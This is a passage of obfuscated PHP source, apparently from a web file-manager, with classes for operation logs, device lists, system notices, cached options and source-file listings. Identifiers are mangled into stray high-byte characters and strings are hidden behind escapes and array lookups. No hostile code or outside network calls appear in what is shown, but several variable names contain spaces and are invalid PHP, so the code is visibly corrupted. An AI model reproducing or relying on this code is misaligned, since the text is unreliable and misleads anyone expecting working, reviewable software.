$¿Àè†ñ€))->delete(); } private function _makeOrder($‡·Œ’¦Ş = '') { $ÂÎÅ×€Ï =& $_SERVER[…É¦À–]; $ÈÙ¶Å Æ = $ÂÎÅ×€Ï[201]; $Ï¨Â·Ó = array($ÂÎÅ×€Ï[479] => $ÂÎÅ×€Ï[480], $ÂÎÅ×€Ï[481] => $ÂÎÅ×€Ï[482]); $ßÃ©Õúè = Input::get($ÂÎÅ×€Ï[487], $ÂÎÅ×€Ï[7], $ÂÎÅ×€Ï[2050], array($ÂÎÅ×€Ï[1968], $ÂÎÅ×€Ï[481])); $ßÃ©Õúè = $Ï¨Â·Ó[$ßÃ©Õúè]; $‡·Œ’¦Ş = $‡·Œ’¦Ş . "{$ÈÙ¶Å Æ}\x20{$ßÃ©Õúè}"; return $this->order($‡·Œ’¦Ş); } public function get($ Ñ‡Éì¾ = '') { $×ğöæ‘í =& $_SERVER[…É¦À–]; if (!$ Ñ‡Éì¾) { show_json(array()); } $ì“–¿ˆ¸ = array(); if ($ Ñ‡Éì¾[$×ğöæ‘í[1687]]) { $ì“–¿ˆ¸[$×ğöæ‘í[1687]] = $ Ñ‡Éì¾[$×ğöæ‘í[1687]]; } if (isset($ Ñ‡Éì¾[$×ğöæ‘í[800]])) { $‡€Šèöä = $ Ñ‡Éì¾[$×ğöæ‘í[800]]; $• Ãòî¯ = isset($ Ñ‡Éì¾[$×ğöæ‘í[801]]) ? $ Ñ‡Éì¾[$×ğöæ‘í[801]] : time(); $ì“–¿ˆ¸[$×ğöæ‘í[201]] = array($×ğöæ‘í[362], array($‡€Šèöä, $• Ãòî¯)); } if ($ Ñ‡Éì¾[$×ğöæ‘í[33]]) { $ãõúÒ« = explode($×ğöæ‘í[50], $ Ñ‡Éì¾[$×ğöæ‘í[33]]); $­›Ü¨ß = $this->typeFile(); $Ê“’Ï•  = array(); foreach ($ãõúÒ« as $¢©èë¹›) { $Ê“’Ï• [] = $¢©èë¹›; if (isset($­›Ü¨ß[$¢©èë¹›])) { $Ê“’Ï•  = array_merge($Ê“’Ï• , $­›Ü¨ß[$¢©èë¹›]); } } $Ê“’Ï•  = array_unique($Ê“’Ï• ); if ($Ê“’Ï• ) { $ì“–¿ˆ¸[$×ğöæ‘í[33]] = array($×ğöæ‘í[7], $Ê“’Ï• ); } } else { $ì“–¿ˆ¸[$×ğöæ‘í[33]] = array($×ğöæ‘í[2298], $×ğöæ‘í[2299]); } if (!empty($ Ñ‡Éì¾[$×ğöæ‘í[2297]])) { $ì“–¿ˆ¸[$×ğöæ‘í[482]] = array($×ğöæ‘í[412], "\x25{$ Ñ‡Éì¾[$×ğöæ‘í[2297]]}\45"); } $æóÛÕ¨ƒ = $this->_makeOrder()->where($ì“–¿ˆ¸)->selectPage(); if (empty($æóÛÕ¨ƒ[$×ğöæ‘í[398]])) { show_json(array(), !0, $æóÛÕ¨ƒ[$×ğöæ‘í[395]]); } $æóÛÕ¨ƒ[$×ğöæ‘í[398]] = $this->logList($æóÛÕ¨ƒ[$×ğöæ‘í[398]]); return $æóÛÕ¨ƒ; } private function ipAddress(&$—òÙí‹ê) { $„ß³ùú³ =& $_SERVER[…É¦À–]; if (!empty($—òÙí‹ê[$„ß³ùú³[2297]])) { $Ğ©¬ŒèÁ = IpLocation::get($—òÙí‹ê[$„ß³ùú³[2297]]); } else { $Ğ©¬ŒèÁ = LNG($„ß³ùú³[2300]); } $—òÙí‹ê[$„ß³ùú³[2301]] = $Ğ©¬ŒèÁ; } private function descZipDownload($ƒÀ´å¯, &$£‡¬‡õ) { $æèÛ’Æœ =& $_SERVER[…É¦À–]; if (!isset($ƒÀ´å¯[$æèÛ’Æœ[2302]])) { return; } $ŠÛ§Ç¸› = json_decode($ƒÀ´å¯[$æèÛ’Æœ[2302]], !0); foreach ($ŠÛ§Ç¸› as $Úàüª) { try { $­¯òËªÑ = IO::infoFull($Úàüª[$æèÛ’Æœ[84]]); } catch (Exception $ĞàúÓø) { continue; } $ƒÀ´å¯[$æèÛ’Æœ[84]] = $Úàüª[$æèÛ’Æœ[84]]; $£‡¬‡õ[] = $ƒÀ´å¯[$æèÛ’Æœ[431]] = $­¯òËªÑ[$æèÛ’Æœ[431]]; $£‡¬‡õ[] = $ƒÀ´å¯[$æèÛ’Æœ[2105]] = $­¯òËªÑ[$æèÛ’Æœ[461]]; break; } return $ƒÀ´å¯; } private function getSourceList(&$Ë‡îñĞÇ) { $’ìİôÚÀ =& $_SERVER[…É¦À–]; $„ÓÅ¾à‡ = array(); foreach ($Ë‡îñĞÇ as $æƒ¨ê» => $îØè®Îù) { $»¦–¢„ = json_decode($îØè®Îù[$’ìİôÚÀ[482]], !0); if ($îØè®Îù[$’ìİôÚÀ[33]] == $’ìİôÚÀ[1851]) { $»¦–¢„ = $this->descZipDownload($»¦–¢„, $„ÓÅ¾à‡); $Ë‡îñĞÇ[$æƒ¨ê»][$’ìİôÚÀ[482]] = json_encode($»¦–¢„); continue; } if (strpos($îØè®Îù[$’ìİôÚÀ[33]], $’ìİôÚÀ[2107]) !== 0) { if (!isset($»¦–¢„[$’ìİôÚÀ[84]]) || strpos($îØè®Îù[$’ìİôÚÀ[33]], $’ìİôÚÀ[2303]) !== 0) { continue; } try { $Õ·üÁÃ¨ = IO::infoFull($»¦–¢„[$’ìİôÚÀ[84]]); } catch (Exception $§õî´¡·) { continue; } $„ÓÅ¾à‡[] = $»¦–¢„[$’ìİôÚÀ[431]] = $Õ·üÁÃ¨[$’ìİôÚÀ[431]]; $„ÓÅ¾à‡[] = $»¦–¢„[$’ìİôÚÀ[2105]] = $Õ·üÁÃ¨[$’ìİôÚÀ[461]]; $Ë‡îñĞÇ[$æƒ¨ê»][$’ìİôÚÀ[482]] = json_encode($»¦–¢„); continue; } $„ÓÅ¾à‡[] = $»¦–¢„[$’ìİôÚÀ[431]]; $„ÓÅ¾à‡[] = $»¦–¢„[$’ìİôÚÀ[2105]]; if ($»¦–¢„[$’ìİôÚÀ[33]] == $’ìİôÚÀ[577]) { $„ÓÅ¾à‡[] = $»¦–¢„[$’ìİôÚÀ[482]][$’ìİôÚÀ[1205]]; $„ÓÅ¾à‡[] = $»¦–¢„[$’ìİôÚÀ[482]][$’ìİôÚÀ[1206]]; } if ($»¦–¢„[$’ìİôÚÀ[33]] == $’ìİôÚÀ[2115]) { $„ÓÅ¾à‡[] = $»¦–¢„[$’ìİôÚÀ[482]][$’ìİôÚÀ[431]]; } } if (!$„ÓÅ¾à‡) { return array(); } return Model($’ìİôÚÀ[865])->sourceListInfo($„ÓÅ¾à‡, !0); } private function logList($›‰ìœñ¾) { $À±£ÒÍ… =& $_SERVER[…É¦À–]; $ãáéÆê = array_to_keyvalue($›‰ìœñ¾, $À±£ÒÍ…[12], $À±£ÒÍ…[1687]); $Ô«¯¼í = Model($À±£ÒÍ…[554])->userListInfo(array_unique($ãáéÆê)); $§ƒÆø“ = $this->getSourceList($›‰ìœñ¾); $¼ÄêÇñÙ = $this->typeAll(); $ßƒŠ·š÷ = array(); $³ô¹•¿ = array(); foreach ($›‰ìœñ¾ as $¡…–Â¶ú => $ÏÓ–â¡ê) { $¡÷—î = $ÏÓ–â¡ê[$À±£ÒÍ…[33]]; $©’¯à¥¢ = isset($Ô«¯¼í[$ÏÓ–â¡ê[$À±£ÒÍ…[1687]]]) ? $Ô«¯¼í[$ÏÓ–â¡ê[$À±£ÒÍ…[1687]]] : !1; $×Àù› = strpos($¡÷—î, $À±£ÒÍ…[2304]) === 0 ? LNG($À±£ÒÍ…[2305]) : LNG($À±£ÒÍ…[2300]); $ÏÓ–â¡ê[$À±£ÒÍ…[32]] = isset($©’¯à¥¢[$À±£ÒÍ…[32]]) ? $©’¯à¥¢[$À±£ÒÍ…[32]] : LNG($À±£ÒÍ…[2300]); $ÏÓ–â¡ê[$À±£ÒÍ…[561]] = isset($©’¯à¥¢[$À±£ÒÍ…[561]]) ? $©’¯à¥¢[$À±£ÒÍ…[561]] : $À±£ÒÍ…[12]; $ÏÓ–â¡ê[$À±£ÒÍ…[1584]] = isset($¼ÄêÇñÙ[$¡÷—î]) ? $¼ÄêÇñÙ[$¡÷—î] : $×Àù›; $ÏÓ–â¡ê[$À±£ÒÍ…[2049]] = $©’¯à¥¢; $ÔÖù´Å¾ = json_decode($ÏÓ–â¡ê[$À±£ÒÍ…[482]], !0); $ÏÓ–â¡ê[$À±£ÒÍ…[2297]] = isset($ÔÖù´Å¾[$À±£ÒÍ…[2297]]) ? $ÔÖù´Å¾[$À±£ÒÍ…[2297]] : $À±£ÒÍ…[12]; $ÏÓ–â¡ê[$À±£ÒÍ…[2301]] = IpLocation::get($ÏÓ–â¡ê[$À±£ÒÍ…[2297]]); if (strpos($¡÷—î, $À±£ÒÍ…[2107]) === 0 || isset($ÔÖù´Å¾[$À±£ÒÍ…[2105]])) { $ÔÖù´Å¾[$À±£ÒÍ…[87]] = $§ƒÆø“[$ÔÖù´Å¾[$À±£ÒÍ…[431]]]; $ÔÖù´Å¾[$À±£ÒÍ…[2120]] = $§ƒÆø“[$ÔÖù´Å¾[$À±£ÒÍ…[2105]]]; if ($ÔÖù´Å¾[$À±£ÒÍ…[33]] == $À±£ÒÍ…[577]) { $ÔÖù´Å¾[$À±£ÒÍ…[482]][$À±£ÒÍ…[1205]] = $§ƒÆø“[$ÔÖù´Å¾[$À±£ÒÍ…[482]][$À±£ÒÍ…[1205]]]; $ÔÖù´Å¾[$À±£ÒÍ…[482]][$À±£ÒÍ…[1206]] = $§ƒÆø“[$ÔÖù´Å¾[$À±£ÒÍ…[482]][$À±£ÒÍ…[1206]]]; } if ($ÔÖù´Å¾[$À±£ÒÍ…[33]] == $À±£ÒÍ…[2115]) { $ÔÖù´Å¾[$À±£ÒÍ…[482]][$À±£ÒÍ…[431]] = $§ƒÆø“[$ÔÖù´Å¾[$À±£ÒÍ…[482]][$À±£ÒÍ…[431]]]; } if ($ÔÖù´Å¾[$À±£ÒÍ…[33]] == $À±£ÒÍ…[1846]) { $ÔÖù´Å¾[$À±£ÒÍ…[2120]] = $ÔÖù´Å¾[$À±£ÒÍ…[87]]; $ÔÖù´Å¾[$À±£ÒÍ…[2105]] = $ÔÖù´Å¾[$À±£ÒÍ…[2120]][$À±£ÒÍ…[431]]; $ÔÖù´Å¾[$À±£ÒÍ…[87]] = !1; $ÔÖù´Å¾[$À±£ÒÍ…[431]] = $À±£ÒÍ…[12]; } if ($ÔÖù´Å¾[$À±£ÒÍ…[87]] && $ÔÖù´Å¾[$À±£ÒÍ…[87]][$À±£ÒÍ…[440]] == $À±£ÒÍ…[1332]) { $³ô¹•¿[] = $ÏÓ–â¡ê[$À±£ÒÍ…[428]]; unset($›‰ìœñ¾[$¡…–Â¶ú]); continue; } if ($ÔÖù´Å¾[$À±£ÒÍ…[2120]] && $ÔÖù´Å¾[$À±£ÒÍ…[2120]][$À±£ÒÍ…[440]] == $À±£ÒÍ…[1332]) { $³ô¹•¿[] = $ÏÓ–â¡ê[$À±£ÒÍ…[428]]; unset($›‰ìœñ¾[$¡…–Â¶ú]); continue; } } $ÏÓ–â¡ê[$À±£ÒÍ…[482]] = $ÔÖù´Å¾; unset($ÏÓ–â¡ê[$À±£ÒÍ…[2306]]); $ßƒŠ·š÷[] = $ÏÓ–â¡ê; } $this->clearSystemPathLog($³ô¹•¿); return $ßƒŠ·š÷; } private function clearSystemPathLog($éèÕ¨©Î) { $‚ı»ÒÓ =& $_SERVER[…É¦À–]; if (count($éèÕ¨©Î) == 0) { return; } $òâˆœ³» = array($‚ı»ÒÓ[428] => array($‚ı»ÒÓ[7], array_unique($éèÕ¨©Î))); $this->where($òâˆœ³»)->delete(); } public function deviceList($±°ÅúŒ½, $‡©‚°  = 0) { $ã”’Ç‰¾ =& $_SERVER[…É¦À–]; $İ”¼ñ© = array($ã”’Ç‰¾[1687] => $±°ÅúŒ½, $ã”’Ç‰¾[201] => array($ã”’Ç‰¾[1059], $‡©‚° ), $ã”’Ç‰¾[33] => $ã”’Ç‰¾[1820]); $©ĞÉè­ê = array(); $·‰ãñ‚Ç = $this->field($ã”’Ç‰¾[2307])->where($İ”¼ñ©)->order($ã”’Ç‰¾[2118])->limit(50)->select(); foreach ($·‰ãñ‚Ç as $Ë†¦…˜í => $ÓìÛÁëß) { if ($Ë†¦…˜í > 0 && abs($ÓìÛÁëß[$ã”’Ç‰¾[201]] - $·‰ãñ‚Ç[$Ë†¦…˜í - 1][$ã”’Ç‰¾[201]]) < 5) { continue; } $¬¿š…„Ÿ = json_decode($ÓìÛÁëß[$ã”’Ç‰¾[482]], !0); $ÓìÛÁëß[$ã”’Ç‰¾[2297]] = isset($¬¿š…„Ÿ[$ã”’Ç‰¾[2297]]) ? $¬¿š…„Ÿ[$ã”’Ç‰¾[2297]] : $ã”’Ç‰¾[12]; unset($¬¿š…„Ÿ[$ã”’Ç‰¾[2297]]); $ƒ‚ááê§ = $this->deviceType($¬¿š…„Ÿ[$ã”’Ç‰¾[2108]]); if (isset($©ĞÉè­ê[$ƒ‚ááê§])) { continue; } $ÓìÛÁëß[$ã”’Ç‰¾[2301]] = IpLocation::get($ÓìÛÁëß[$ã”’Ç‰¾[2297]]); $ÓìÛÁëß[$ã”’Ç‰¾[482]] = $¬¿š…„Ÿ; $©ĞÉè­ê[$ƒ‚ááê§] = $ÓìÛÁëß; } return array_values($©ĞÉè­ê); } public function deviceType($ÓüØÎÎÀ) { return $ÓüØÎÎÀ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\x6e\x6f\164\151\143\x65\114\x69\163\x74"; public $field = array("\156\141\155\x65", "\x63\157\x6e\164\145\x6e\164", "\141\165\x74\150", "\155\157\144\x65", "\164\151\x6d\145", "\164\171\x70\145", "\x6c\145\166\x65\x6c", "\145\x6e\x61\x62\154\x65", "\x73\x6f\x72\x74"); public function listData($ğØÂ¤³  = false, $À¸Ñ‰ = "\x73\x6f\x72\164", $„òù¿éÎ = false) { return parent::listData($ğØÂ¤³ , $À¸Ñ‰, $„òù¿éÎ); } public function add($˜¨¤ä‚“) { $ì¬ŞØ½ =& $_SERVER[…É¦À–]; $Ó”À¤ò = time(); if ($˜¨¤ä‚“[$ì¬ŞØ½[16]] == $ì¬ŞØ½[2308]) { $Ó”À¤ò = strtotime($˜¨¤ä‚“[$ì¬ŞØ½[180]]); } $˜¨¤ä‚“[$ì¬ŞØ½[180]] = $Ó”À¤ò; return parent::insert($˜¨¤ä‚“); } public function update($Ö˜ö‚õô, $³Æ÷¨¨¤) { $Á˜ƒ·è =& $_SERVER[…É¦À–]; $ŸşÜ¬Ä‘ = $this->listData($Ö˜ö‚õô); if (!$ŸşÜ¬Ä‘) { return !1; } $® ëåå = time(); if ($³Æ÷¨¨¤[$Á˜ƒ·è[16]] == $Á˜ƒ·è[2308]) { $® ëåå = strtotime($³Æ÷¨¨¤[$Á˜ƒ·è[180]]); } $³Æ÷¨¨¤[$Á˜ƒ·è[180]] = $® ëåå; return parent::update($Ö˜ö‚õô, $³Æ÷¨¨¤); } public function remove($ôÊŠª¸µ) { $ÚåÍîà® = $this->listData($ôÊŠª¸µ); if (!$ÚåÍîà® || $ÚåÍîà®[$_SERVER[…É¦À–][1332]]) { return !1; } return parent::remove($ôÊŠª¸µ); } public function sort($øƒóêäó, $ıç’ı±) { return parent::update($øƒóêäó, $ıç’ı±); } public function enable($†Ã«Ó¥•, $‹Îö¿õ²) { return parent::update($†Ã«Ó¥•, array($_SERVER[…É¦À–][2309] => $‹Îö¿õ²)); } private function initUserOption() { $‘‚‡ïèñ =& $_SERVER[…É¦À–]; $this->optionType = $‘‚‡ïèñ[2310]; $this->modelType = $‘‚‡ïèñ[2311]; $this->field = array($‘‚‡ïèñ[2312], $‘‚‡ïèñ[32], $‘‚‡ïèñ[180], $‘‚‡ïèñ[33], $‘‚‡ïèñ[2313], $‘‚‡ïèñ[790], $‘‚‡ïèñ[196]); } public function userNoticeGet($×Ú”…Òí = false) { $this->initUserOption(); return parent::listData($×Ú”…Òí, $_SERVER[…É¦À–][428], !0); } public function userNoticeAdd($î‚ô¥×ñ) { $¦ŒÌ…í” =& $_SERVER[…É¦À–]; $this->initUserOption(); $ÜÅüË¯œ = $this->findByKey($¦ŒÌ…í”[2312], $î‚ô¥×ñ[$¦ŒÌ…í”[428]]); if ($ÜÅüË¯œ) { return !0; } $¸Íö˜ó™ = array($¦ŒÌ…í”[2312] => $î‚ô¥×ñ[$¦ŒÌ…í”[428]], $¦ŒÌ…í”[32] => $î‚ô¥×ñ[$¦ŒÌ…í”[32]], $¦ŒÌ…í”[180] => $î‚ô¥×ñ[$¦ŒÌ…í”[180]], $¦ŒÌ…í”[33] => isset($î‚ô¥×ñ[$¦ŒÌ…í”[33]]) ? $î‚ô¥×ñ[$¦ŒÌ…í”[33]] : 1, $¦ŒÌ…í”[2313] => isset($î‚ô¥×ñ[$¦ŒÌ…í”[2313]]) ? $î‚ô¥×ñ[$¦ŒÌ…í”[2313]] : 0, $¦ŒÌ…í”[790] => 0, $¦ŒÌ…í”[196] => 0); return parent::insert($¸Íö˜ó™); } public function userNoticeEdit($ÓÑ¡äÅ, $³ÏÑÄ§”) { $this->initUserOption(); return parent::update($ÓÑ¡äÅ, $³ÏÑÄ§”); } } goto fÖ—Œ–¢Ç–; BŒâèõ ©Æ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ñ±ã‡„ = false, $‘ÂƒÇ«İ = '', $ğ«äÕ = false) { $È³¼ùõİ =& $_SERVER[…É¦À–]; $ÅóíÊ†¹ = $this->cacheGet($‘ÂƒÇ«İ); $ºêùää® = $this->optionDefault($‘ÂƒÇ«İ); $ºêùää® = is_array($ºêùää®) ? $ºêùää® : array(); if (is_array($ÅóíÊ†¹)) { $ÅóíÊ†¹ = array_merge($ºêùää®, $ÅóíÊ†¹); return $ñ±ã‡„ ? isset($ÅóíÊ†¹[$ñ±ã‡„]) ? $ÅóíÊ†¹[$ñ±ã‡„] : null : $ÅóíÊ†¹; } $Áã–¼¨® = $this->filterWhere(array($È³¼ùõİ[33] => $‘ÂƒÇ«İ)); $ÅóíÊ†¹ = $this->where($Áã–¼¨®)->select(); $ÅóíÊ†¹ = array_to_keyvalue($ÅóíÊ†¹, $È³¼ùõİ[94], $È³¼ùõİ[403]); foreach ($ÅóíÊ†¹ as $‰Í¿µÉÖ => $Ÿ»¼˜õ) { if ($ğ«äÕ || in_array($‰Í¿µÉÖ, $this->jsonField)) { $ÅóíÊ†¹[$‰Í¿µÉÖ] = json_decode($Ÿ»¼˜õ, !0); } } $this->cacheSet($‘ÂƒÇ«İ, $ÅóíÊ†¹); $ÅóíÊ†¹ = array_merge($ºêùää®, $ÅóíÊ†¹); return $ñ±ã‡„ ? $ÅóíÊ†¹[$ñ±ã‡„] : $ÅóíÊ†¹; } public function set($èÚ‚¶ç, $ô¸ëªøû = false, $ª¡Ôºì = '') { $İ´Á‚Œß =& $_SERVER[…É¦À–]; $this->cacheRemove($ª¡Ôºì); $¹„ãÏè‡ = array(); $‚Æ¹‡“ê = is_array($èÚ‚¶ç) ? $èÚ‚¶ç : array($èÚ‚¶ç => $ô¸ëªøû); foreach ($‚Æ¹‡“ê as $úª÷ĞËê => $ÆÀ‹ ˜) { if (is_array($ÆÀ‹ ˜)) { $ÆÀ‹ ˜ = json_encode_force($ÆÀ‹ ˜); } $this->checkLength($ÆÀ‹ ˜, !1, $this->tableName . $İ´Á‚Œß[4] . $èÚ‚¶ç); $ÆÀ‹ ˜ = self::textEncode($ÆÀ‹ ˜); $‚Æ¹‡“ê = array($İ´Á‚Œß[33] => $ª¡Ôºì, $İ´Á‚Œß[94] => $úª÷ĞËê, $İ´Á‚Œß[403] => $ÆÀ‹ ˜); $¹„ãÏè‡[] = $this->filterWhere($‚Æ¹‡“ê); } if (!$¹„ãÏè‡) { return !0; } $™Ã‡Õµ = $this->cacheKey($İ´Á‚Œß[429]); CacheLock::lock($™Ã‡Õµ); $ø²ÄË°ò = $this->addAll($¹„ãÏè‡, array(), !0); CacheLock::unlock($™Ã‡Õµ); return $ø²ÄË°ò; } protected function optionDefault($µÖŞ¯Ìà = '') { return !1; } public function setDeep($¨ˆ‡ÁÁÑ, $÷¤ØûËá = false, $ñ²‘•ª = '') { $³ªªĞ¤ú = explode($_SERVER[…É¦À–][10], $¨ˆ‡ÁÁÑ); $•ú˜’ = $this->get(); array_set_value($•ú˜’, $¨ˆ‡ÁÁÑ, $÷¤ØûËá); $this->set($³ªªĞ¤ú[0], $•ú˜’[$³ªªĞ¤ú[0]], $ñ²‘•ª); } public function remove($¼Ô¦·‡, $ÊıÄ‰Ä = '') { $Šõˆ¼¤ =& $_SERVER[…É¦À–]; $this->cacheRemove($ÊıÄ‰Ä); $ó»ø …Ş = $this->filterWhere(array($Šõˆ¼¤[94] => $¼Ô¦·‡, $Šõˆ¼¤[33] => $ÊıÄ‰Ä)); if (is_null($¼Ô¦·‡)) { unset($ó»ø …Ş[$Šõˆ¼¤[94]]); } return $this->where($ó»ø …Ş)->delete(); } public function cacheSet($º´œ”íÖ, $Š¾š®Š– = false) { return Cache::set($this->cacheKey($º´œ”íÖ), $Š¾š®Š–); } public function cacheGet($§’Ò·ñ•) { return Cache::get($this->cacheKey($§’Ò·ñ•)); } public function cacheRemove($†’âäè“) { return Cache::remove($this->cacheKey($†’âäè“)); } protected function filterWhere($Ô¿ÓÄ¾) { return $Ô¿ÓÄ¾; } protected function cacheKey($€êÇõ­û) { return $€êÇõ­û; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\x63\145"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\x6d\x65" => "\151\157\137\x73\x6f\x75\162\143\145\x5f\155\145\x74\x61", "\x6d\x65\x74\141\x46\x69\145\x6c\x64" => "\163\157\165\x72\143\145\x49\104"); protected $dataAuto = array(array("\155\157\144\151\x66\x79\x54\151\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\x73\x65\x72\164", "\146\165\x6e\x63\x74\151\x6f\x6e"), array("\x63\x72\145\141\x74\x65\x54\151\155\145", "\x74\151\155\x65", "\151\x6e\x73\145\x72\164", "\x66\165\x6e\x63\164\151\x6f\156"), array("\166\151\x65\x77\x54\x69\155\145", "\x74\151\155\145", "\x69\x6e\x73\145\x72\x74", "\146\x75\156\x63\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¨šœ‡µƒ) { return $this->listSource(array($_SERVER[…É¦À–][430] => $¨šœ‡µƒ)); } public function typeName($¹¢´ú°) { static $î¼ìèÒÀ = array(self::TYPE_SYSTEM => "\163\x79\163\x74\145\x6d", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\147\162\157\165\160"); return $î¼ìèÒÀ[$¹¢´ú° . $_SERVER[…É¦À–][12]]; } public function sourceListInfo($•©ğ€ªœ, $ö¶à²”¤ = false) { $Øäı“ì… =& $_SERVER[…É¦À–]; $•©ğ€ªœ = $•©ğ€ªœ ? $•©ğ€ªœ : array(); $•©ğ€ªœ = array_filter(array_unique($•©ğ€ªœ)); if (!$•©ğ€ªœ) { return array(); } $ÃŒ¢·Ÿ´ = $this->where(array($Øäı“ì…[431] => array($Øäı“ì…[7], $•©ğ€ªœ)))->select(); $this->_listDataApply($ÃŒ¢·Ÿ´, $ö¶à²”¤); return array_to_keyvalue($ÃŒ¢·Ÿ´, $Øäı“ì…[431]); } public function pathInfoFilter(&$Ş±Œ’ÏÌ) { $‰ôñÈ¶ =& $_SERVER[…É¦À–]; static $à«Äí»Õ = false; static $Õ¾Â‡ï½ = false; static $º¥‚‰ Ï = false; if (!$à«Äí»Õ) { $ƒ¸è´í  = $‰ôñÈ¶[432]; $ƒ¸è´í  .= $‰ôñÈ¶[433]; $ƒ¸è´í  .= $‰ôñÈ¶[434]; $éÉ‚ öÖ = $‰ôñÈ¶[435]; $»óÆï‹î = explode($‰ôñÈ¶[50], $éÉ‚ öÖ); $à«Äí»Õ = explode($‰ôñÈ¶[50], $ƒ¸è´í ); $Õ¾Â‡ï½ = array(); foreach ($à«Äí»Õ as $Û˜´ÆµÒ) { if (in_array($Û˜´ÆµÒ, $»óÆï‹î)) { continue; } $Õ¾Â‡ï½[] = $Û˜´ÆµÒ; } $º¥‚‰ Ï = explode($‰ôñÈ¶[50], $‰ôñÈ¶[436]); } foreach ($º¥‚‰ Ï as $‚Ä¼©•®) { if (isset($Ş±Œ’ÏÌ[$‚Ä¼©•®])) { $Ş±Œ’ÏÌ[$‚Ä¼©•®] = intval($Ş±Œ’ÏÌ[$‚Ä¼©•®]); } } $Ş±Œ’ÏÌ[$‰ôñÈ¶[84]] = $‰ôñÈ¶[437] . $Ş±Œ’ÏÌ[$‰ôñÈ¶[431]] . $‰ôñÈ¶[438]; $Ş±Œ’ÏÌ[$‰ôñÈ¶[33]] = $Ş±Œ’ÏÌ[$‰ôñÈ¶[439]] == 1 ? $‰ôñÈ¶[75] : $‰ôñÈ¶[200]; $Ş±Œ’ÏÌ[$‰ôñÈ¶[440]] = $this->typeName($Ş±Œ’ÏÌ[$‰ôñÈ¶[440]]); if ($Ş±Œ’ÏÌ[$‰ôñÈ¶[439]] != 1) { $Ş±Œ’ÏÌ[$‰ôñÈ¶[174]] = $Ş±Œ’ÏÌ[$‰ôñÈ¶[441]]; unset($Ş±Œ’ÏÌ[$‰ôñÈ¶[441]]); } $ø ëËëÓ = $à«Äí»Õ; if (isset($Ş±Œ’ÏÌ[$‰ôñÈ¶[442]]) && $Ş±Œ’ÏÌ[$‰ôñÈ¶[442]][$‰ôñÈ¶[443]] == -1) { $ø ëËëÓ = $Õ¾Â‡ï½; } $Ş±Œ’ÏÌ = array_field_key($Ş±Œ’ÏÌ, $ø ëËëÓ); return $Ş±Œ’ÏÌ; } public function listUserFav() { $‘¡¿Šµ =& $_SERVER[…É¦À–]; $ò±ĞÂÜÅ = Model($‘¡¿Šµ[444])->listData(); $±Õ•¦ûˆ = array_filter_by_field($ò±ĞÂÜÅ, $‘¡¿Šµ[33], $‘¡¿Šµ[445]); $±Õ•¦ûˆ = array_to_keyvalue($±Õ•¦ûˆ, $‘¡¿Šµ[12], $‘¡¿Šµ[84]); if ($±Õ•¦ûˆ) { $Æ÷ÙÓø‹ = $this->listSource(array($‘¡¿Šµ[446] => array($‘¡¿Šµ[447], $±Õ•¦ûˆ))); } $Æ÷ÙÓø‹ = array_to_keyvalue($Æ÷ÙÓø‹[$‘¡¿Šµ[398]], $‘¡¿Šµ[431]); foreach ($ò±ĞÂÜÅ as &$¾åñ¾„¯) { $¾åñ¾„¯ = array($‘¡¿Šµ[448] => $¾åñ¾„¯[$‘¡¿Šµ[428]], $‘¡¿Šµ[449] => $¾åñ¾„¯[$‘¡¿Šµ[32]], $‘¡¿Šµ[450] => $¾åñ¾„¯[$‘¡¿Šµ[84]], $‘¡¿Šµ[451] => $¾åñ¾„¯[$‘¡¿Šµ[33]], $‘¡¿Šµ[452] => $¾åñ¾„¯[$‘¡¿Šµ[201]], $‘¡¿Šµ[453] => $¾åñ¾„¯[$‘¡¿Šµ[85]]); if ($¾åñ¾„¯[$‘¡¿Šµ[33]] == $‘¡¿Šµ[445] && $Æ÷ÙÓø‹[$¾åñ¾„¯[$‘¡¿Šµ[84]]]) { $¾åñ¾„¯[$‘¡¿Šµ[87]] = $Æ÷ÙÓø‹[$¾åñ¾„¯[$‘¡¿Šµ[84]]]; } } unset($¾åñ¾„¯); return $ò±ĞÂÜÅ; } public function listUserTag($­Äçµƒ) { $…ß›øƒ =& $_SERVER[…É¦À–]; if ($­Äçµƒ && !is_array($­Äçµƒ)) { $­Äçµƒ = array($­Äçµƒ); } $ª‹üë’ = Model($…ß›øƒ[454])->listData(); $ıŞÜğŸ¥ = array(); $ÎêÎ“Âå = array(); foreach ($ª‹üë’ as $½ãÜéë) { $çÖ¦ÕİŠ = $½ãÜéë[$…ß›øƒ[84]]; if (!$çÖ¦ÕİŠ) { continue; } if (!isset($ÎêÎ“Âå[$çÖ¦ÕİŠ])) { $ÎêÎ“Âå[$çÖ¦ÕİŠ] = array(); } $ÎêÎ“Âå[$çÖ¦ÕİŠ][] = $½ãÜéë[$…ß›øƒ[455]]; $ıŞÜğŸ¥[$½ãÜéë[$…ß›øƒ[84]]] = $½ãÜéë; } $¸ÙÙ™…ş = array(); $ÎûÙ•¸å = array(); $À–˜Í©¨ = array(); foreach ($ÎêÎ“Âå as $‡­¬ƒÊ => $µŒï×ğ†) { $µÍã°¢÷ = !0; if (!$­Äçµƒ) { $¸ÙÙ™…ş[] = $‡­¬ƒÊ; continue; } foreach ($­Äçµƒ as $·±€ÈÉ”) { if (!in_array($·±€ÈÉ”, $µŒï×ğ†)) { $µÍã°¢÷ = !1; break; } } if (!$µÍã°¢÷) { continue; } if (!is_numeric($‡­¬ƒÊ)) { $ÀÜø™©û = $ıŞÜğŸ¥[$‡­¬ƒÊ]; $àµ¦–Ñ· = array($…ß›øƒ[32] => $ÀÜø™©û[$…ß›øƒ[32]], $…ß›øƒ[84] => $ÀÜø™©û[$…ß›øƒ[84]], $…ß›øƒ[33] => $ÀÜø™©û[$…ß›øƒ[33]], $…ß›øƒ[87] => array($…ß›øƒ[456] => 1), $…ß›øƒ[202] => !0); if ($ÀÜø™©û[$…ß›øƒ[33]] == $…ß›øƒ[200]) { $À–˜Í©¨[] = $àµ¦–Ñ·; } if ($ÀÜø™©û[$…ß›øƒ[33]] == $…ß›øƒ[75]) { $ÎûÙ•¸å[] = 